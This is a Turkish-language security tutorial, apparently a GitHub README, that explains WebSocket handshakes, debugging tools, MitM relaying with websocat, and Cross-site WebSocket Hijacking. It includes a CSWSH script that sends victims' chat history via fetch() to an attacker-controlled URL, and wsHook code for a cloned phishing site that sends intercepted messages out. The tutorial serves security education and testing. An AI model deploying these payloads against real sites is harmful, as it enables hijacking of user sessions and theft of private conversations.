# WebSockets Nedir?

WebSockets, genellikle uzun ömürlü olan ve tipik olarak HTTP üzerinden başlatılan bağlantılardır. İletişim her iki yönde de herhangi bir zamanda gerçekleşebilir ve genellikle bağlantı, istemci veya sunucunun bir mesaj göndermeye hazır olduğu ana kadar açık ve boşta kalır. WebSockets, düşük gecikme veya sunucu başlatmalı mesajlar gibi durumlarda kullanışlıdır, örneğin finansal verilerin gerçek zamanlı akışları.

## Neler öğreneceğiz?

- WebSockets Nedir?
- WebSockets Bağlantısı Nasıl Kurulur?
- Linux Konsolu ile WebSocket Bağlantısı Kurma
- WebSocket Bağlantılarını Man-in-the-Middle (MitM) Yapma
- WebSocket Enumerasyonu ve Güvenlik Analizi
- WebSockets Hata Ayıklama Araçları ve İpuçları
- Cross-site WebSocket Hijacking (CSWSH) Tehdidi ve Savunma
- Kullanıcıdan Veri Çalmak İçin WebSocket Saldırıları


## WebSockets Bağlantısı Nasıl Kurulur?

WebSockets bağlantıları genellikle şu şekilde, istemci tarafında JavaScript kullanılarak oluşturulur:

```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```

"**wss**" protokolü, şifreli bir TLS bağlantısı üzerinden WebSocket'i kurar; "**ws**" protokolü ise şifrelenmemiş bir bağlantı kullanır. Bağlantıyı kurmak için tarayıcı ve sunucu, bir HTTP üzerinden WebSocket el sıkışması gerçekleştirir. Tarayıcı, şu şekilde bir WebSocket el sıkışması isteği gönderir:

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

Eğer sunucu bağlantıyı kabul ederse, şu şekilde bir WebSocket el sıkışması yanıtı döner:

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

Bu noktadan sonra ağ bağlantısı açık kalır ve her iki yönde WebSocket mesajları göndermek için kullanılabilir.

## Notlar
WebSocket el sıkışması mesajlarının bazı özellikleri şunlardır:
- İstek ve yanıtın **Connection** ve **Upgrade** başlıkları, bu el sıkışmasının bir WebSocket el sıkışması olduğunu belirtir.
- **Sec-WebSocket-Version** istek başlığı, istemcinin kullanmak istediği WebSocket protokol sürümünü belirtir. Genellikle 13'tür.
- **Sec-WebSocket-Key** istek başlığı, Base64 ile kodlanmış rasgele bir değeri içerir. Bu değer, her el sıkışma isteğinde rasgele olarak oluşturulmalıdır.
- **Sec-WebSocket-Accept** yanıt başlığı, **Sec-WebSocket-Key** istek başlığındaki değerin, protokol spesifikasyonunda tanımlı belirli bir dize ile birleştirilmiş bir karma değeridir. Bu, yanıltıcı yanıtları önlemek için yapılır.
- **Sec-WebSocket-Key** başlığı, önbellek proxy'lerinden kaynaklanan hataları önlemek için kullanılır ve kimlik doğrulama veya oturum yönetimi amacıyla kullanılmaz (Bir CSRF belirteci değildir).

## WebSockets Bağlantısı (Linux)

websocat kullanarak bir WebSocket ile doğrudan bağlantı kurabilirsiniz:

```bash
websocat --insecure wss://10.10.10.10:8000 -v
```

Veya bir websocat sunucusu oluşturmak için:

```bash
websocat -s 0.0.0.0:8000 # Port 8000'de dinle
```

## WebSocket Bağlantılarında Man-in-the-Middle (MitM) Saldırısı

Eğer istemcilerin mevcut yerel ağınızdan bir HTTP WebSocket'ine bağlandığını fark ederseniz, bir ARP Spoofing Saldırısı kullanarak bir MitM saldırısı yapabilirsiniz. İstemci bağlanmaya çalıştığında şunları kullanabilirsiniz:

```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```

## WebSocket Enumerasyonu

[STEWS](https://github.com/PalindromeLabs/STEWS) aracını kullanarak WebSocket'leri otomatik olarak keşfetmek, parmak izlemek ve bilinen güvenlik açıklarını aramak için kullanabilirsiniz.

## WebSocket Hata Ayıklama Araçları

[Burp Suite](https://portswigger.net/burp) web soket iletişimini normal HTTP iletişiminde olduğu gibi MitM destekler.

[Socketsleuth](https://github.com/summitt/Burp-Suite-SocketSleuth) Burp Suite uzantısı, Websocket iletişimlerini daha iyi yönetmenizi sağlar. Geçmişi alabilir, interception kuralları belirleyebilir, eşleştirme ve değiştirme kurallarını kullanabilir, Intruder ve AutoRepeater kullanabilirsiniz.

[WSSiP](https://github.com/PentesterES/WSSiP) (WebSocket/Socket.io Proxy) adlı bu Node.js aracı, istemci ve sunucu arasındaki tüm WebSocket ve Socket.IO iletişimlerini yakalamak, durdurmak, özel mesajlar göndermek ve görüntülemek için bir kullanıcı arayüzü sağlar.

[wsrepl](https://github.com/hypoweb/wsrepl) interaktif bir WebSocket REPL'dir ve özellikle penetrasyon testi için tasarlanmıştır. Gelen WebSocket mesajlarını gözlemlemek ve yeni mesajlar göndermek için bir arayüz sağlar, bu iletişimi otomatikleştirmek için kullanımı kolay bir çerçeve sunar.

[WebSocketKing](https://websocketking.com/) bir web aracıdır ve web soketleri kullanarak diğer web siteleriyle iletişim kurmanıza olanak tanır.

[Hoppscotch](https://hoppscotch.io/realtime/websocket) WebSocket ve diğer iletişim/protokoller için bir web aracı sağlar.

## Cross-site WebSocket Hijacking (CSWSH)

Ayrıca "**cross-origin WebSocket hijacking**" veya "**cross-origin WebSocket hijacking**" olarak da bilinen bu saldırı, WebSocket el sıkışmasında Cross-Site Request Forgery (CSRF) kullanır. Bu, WebSocket el sıkışma isteğinin yalnızca HTTP çerezlerine güvenmesi ve CSRF belirteçleri veya diğer tahmin edilemez değerleri içermemesi durumunda ortaya çıkar.

### Basit Saldırı

Unutmayın ki bir WebSocket bağlantısı kurulduğunda cookie sunucuya gönderilir. Sunucu, örneğin bir mesajla "READY" ifadesi gönderildiğinde kullanıcıya ait bir konuşma geçmişini geri gönderiyorsa, basit bir XSS bağlantısı kurarak (cookie otomatik olarak gönderilecektir) "READY" mesajını göndererek konuşma geçmişini çalabilirsiniz:

```javascript
<script>
websocket = new WebSocket('wss://websoket-urlsi')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); // Gizli bilgileri almak için mesaj gönder
}

function handleReply(event) {
  // Gizli bilgileri saldırganın sunucusuna gönder
  fetch('https://kendi-makine-urlniz/?'+event.data, {mode: 'no-cors'})
}
</script>
```

## Kullanıcıdan Veri Çalmak

Hedeflenen web uygulamasını taklit etmek için (.html dosyaları gibi) siteyi kopyalayın ve WebSocket iletişiminin gerçekleştiği script içine aşağıdaki kodu ekleyin:

```javascript
<script src='wsHook.js'></script>

//Bu, bir mesaj gönderilmeden önce veya sunucudan alındıktan sonra çalışacak işlevlerdir
//Bu kod, bir <script> etiketi arasında veya bir .js dosyasının içinde olmalıdır
wsHook.before = function(data, url) {
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "client_msg?m="+data, true);
    xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
    xhttp.send();
    return messageEvent;
}
```

Şimdi [wsHook.js](https://github.com/skepticfx/wshook) dosyasını indirin ve web dosyalarının bulunduğu klasörün içine kaydedin.
Web uygulamasını açığa çıkararak ve bir kullanıcının ona bağlanmasını sağlayarak websocket aracılığıyla gönderilen ve alınan mesajları çalabileceksiniz:
```bash
sudo python3 -m http.server 80
```

# Yasal Uyarı!
Bu GitHub deposu, WebSocket teknolojisi üzerinde yapılan saldırılarla ilgili bilgiler içermektedir. Bu bilgiler, siber güvenlik alanındaki profesyoneller ve etik hackerlar için eğitim amaçlı sağlanmaktadır.

**Dikkat:** Bu depo içinde bulunan bilgiler, yalnızca eğitim amaçlıdır ve kötü niyetli kullanım amacı taşımaz. WebSocket saldırıları gerçekleştirilirken yasal düzenlemelere, etik kurallara ve hedef sistemlere izin almadan müdahale etmek yasa dışıdır. Bu depo tarafından sağlanan bilgilerin kötü niyetli kullanımı, yasalar gereğince cezalandırılabilir.
